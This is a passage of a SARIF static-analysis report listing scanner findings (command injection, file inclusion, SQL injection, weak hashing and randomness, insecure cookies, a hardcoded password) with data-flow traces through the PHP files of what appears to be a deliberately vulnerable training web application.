            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:23 - shell_exec(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4430",
      "message" : {
        "text" : "The file index.php passes an unvalidated filename to a dynamic include statement on line 36. Allowing unvalidated user input to control files that are included dynamically in PHP can lead to malicious code execution.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "2CC9C99CE710F376B97AE6D59D6DE904"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/fi/index.php"
          },
          "region" : {
            "startLine" : 36,
            "endLine" : 36,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:4 - Read $_GET['page']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/high.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:36 - builtin_include(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/index.php"
                },
                "region" : {
                  "startLine" : 36
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:4 - Read $_GET['page']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/high.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:4 - Assignment to $file"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/high.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:4 - high.php({$file})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/high.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - high.php(once)({$file})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:36 - builtin_include(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/index.php"
                },
                "region" : {
                  "startLine" : 36
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4570",
      "message" : {
        "text" : "The file index.php passes an unvalidated filename to a dynamic include statement on line 36. Allowing unvalidated user input to control files that are included dynamically in PHP can lead to malicious code execution.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "834B2456912C06091F14089321C4F178"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/fi/index.php"
          },
          "region" : {
            "startLine" : 36,
            "endLine" : 36,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:4 - Read $_GET['page']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/medium.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:36 - builtin_include(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/index.php"
                },
                "region" : {
                  "startLine" : 36
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:4 - Read $_GET['page']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/medium.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:4 - Assignment to $file"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/medium.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - Assignment to $file"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Assignment to $file"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:4 - medium.php({$file})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/medium.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$file})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:36 - builtin_include(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/index.php"
                },
                "region" : {
                  "startLine" : 36
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4657",
      "message" : {
        "text" : "The file index.php passes an unvalidated filename to a dynamic include statement on line 36. Allowing unvalidated user input to control files that are included dynamically in PHP can lead to malicious code execution.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "C2A6C7BACEA1E5899F26850EE8C84BF4"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/fi/index.php"
          },
          "region" : {
            "startLine" : 36,
            "endLine" : 36,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:4 - Read $_GET['page']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/impossible.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:36 - builtin_include(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/index.php"
                },
                "region" : {
                  "startLine" : 36
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:4 - Read $_GET['page']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/impossible.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:4 - Assignment to $file"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/impossible.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:4 - impossible.php({$file})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/impossible.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - impossible.php(once)({$file})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:36 - builtin_include(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/index.php"
                },
                "region" : {
                  "startLine" : 36
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4742",
      "message" : {
        "text" : "The file index.php passes an unvalidated filename to a dynamic include statement on line 36. Allowing unvalidated user input to control files that are included dynamically in PHP can lead to malicious code execution.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "F2DAAE5B3B3E8FF0115D9228AB519AD6"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/fi/index.php"
          },
          "region" : {
            "startLine" : 36,
            "endLine" : 36,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:4 - Read $_GET['page']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/low.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:36 - builtin_include(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/index.php"
                },
                "region" : {
                  "startLine" : 36
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:4 - Read $_GET['page']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/low.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:4 - Assignment to $file"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/low.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:4 - low.php({$file})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/source/low.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$file})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:36 - builtin_include(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/fi/index.php"
                },
                "region" : {
                  "startLine" : 36
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4479",
      "message" : {
        "text" : "The file help.php on line 33 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "51A5816DDDF6BEFD8412ED84210ABF2C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/javascript/help/help.php"
          },
          "region" : {
            "startLine" : 33,
            "endLine" : 33,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "help.php:33"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/javascript/help/help.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "help.php:33"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/javascript/help/help.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4638",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "B284CB2167188D2C315D7F628359FA16"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/javascript/index.php"
          },
          "region" : {
            "startLine" : 43,
            "endLine" : 43,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "index.php:43 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/javascript/index.php"
                },
                "region" : {
                  "startLine" : 43
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:43 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/javascript/index.php"
                },
                "region" : {
                  "startLine" : 43
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4725",
      "message" : {
        "text" : "On line 11 of high.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "EB94DBF518A09F8A1513B014BF2CECFD"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/sqli/source/high.php"
          },
          "region" : {
            "startLine" : 11,
            "endLine" : 11,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:11 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4650",
      "message" : {
        "text" : "Line 11 of low.php invokes a SQL query built with input that comes from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "BB0F5F07497CC14452A83B1A07DAF922"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/sqli/source/low.php"
          },
          "region" : {
            "startLine" : 11,
            "endLine" : 11,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:11 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:10 - Assignment to $query"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:11 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4458",
      "message" : {
        "text" : "Line 12 of medium.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "3F5E7A9E44323081569A476563B14943"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/sqli/source/medium.php"
          },
          "region" : {
            "startLine" : 12,
            "endLine" : 12,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:12 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:11 - Assignment to $query"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:12 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4535",
      "message" : {
        "text" : "Hardcoded passwords could compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "6D9AD425D9F247A0748CAB8C869409CE"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/sqli/test.php"
          },
          "region" : {
            "startLine" : 4,
            "endLine" : 4,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "test.php:4 - FieldAccess: $password"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/test.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test.php:4 - FieldAccess: $password"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/test.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test.php:4 - Field: $password"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/test.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4555",
      "message" : {
        "text" : "The program creates a cookie without setting the <code>Secure</code> flag to <code>true</code>\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "78B1FF65E2AB5A5EC0E912C3293652D6"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/sqli_blind/cookie-input.php"
          },
          "region" : {
            "startLine" : 12,
            "endLine" : 12,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "cookie-input.php:12 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/cookie-input.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "cookie-input.php:12 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/cookie-input.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4608",
      "message" : {
        "text" : "Including unvalidated data in Cookies can lead to HTTP Response header manipulation and enable cache-poisoning, cross-site scripting, cross-user defacement, page hijacking, cookie manipulation or open redirect.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "9954AB0C6ED596105A480B962ECF2824"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/sqli_blind/cookie-input.php"
          },
          "region" : {
            "startLine" : 12,
            "endLine" : 12,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "cookie-input.php:12 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/cookie-input.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "cookie-input.php:12 - setcookie(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/cookie-input.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "cookie-input.php:12 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/cookie-input.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "cookie-input.php:12 - setcookie(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/cookie-input.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4682",
      "message" : {
        "text" : "The program creates a cookie in cookie-input.php on line 12, but fails to set the <code>HttpOnly</code> flag to <code>true</code>.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "D00FD97D76054B3935104F546EA878F4"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/sqli_blind/cookie-input.php"
          },
          "region" : {
            "startLine" : 12,
            "endLine" : 12,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "cookie-input.php:12 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/cookie-input.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "cookie-input.php:12 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/cookie-input.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4450",
      "message" : {
        "text" : "Line 12 of high.php invokes a SQL query built with input that comes from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "39EB2C6F81B6A70F3154AE02730DEBE5"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/sqli_blind/source/high.php"
          },
          "region" : {
            "startLine" : 12,
            "endLine" : 12,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_COOKIE['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:12 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/high.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_COOKIE['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - Assignment to $query"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:12 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/high.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4686",
      "message" : {
        "text" : "The random number generator implemented by rand() cannot withstand a cryptographic attack.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "D4CBEA47781BABCD72DADDD9BC2BE2DB"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/sqli_blind/source/high.php"
          },
          "region" : {
            "startLine" : 47,
            "endLine" : 47,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:47 - rand()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/high.php"
                },
                "region" : {
                  "startLine" : 47
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:47 - rand()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/high.php"
                },
                "region" : {
                  "startLine" : 47
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4433",
      "message" : {
        "text" : "The random number generator implemented by rand() cannot withstand a cryptographic attack.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "2DA3814C829E18CE5FD3AA12A3EBDFB8"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/sqli_blind/source/high.php"
          },
          "region" : {
            "startLine" : 48,
            "endLine" : 48,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:48 - rand()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/high.php"
                },
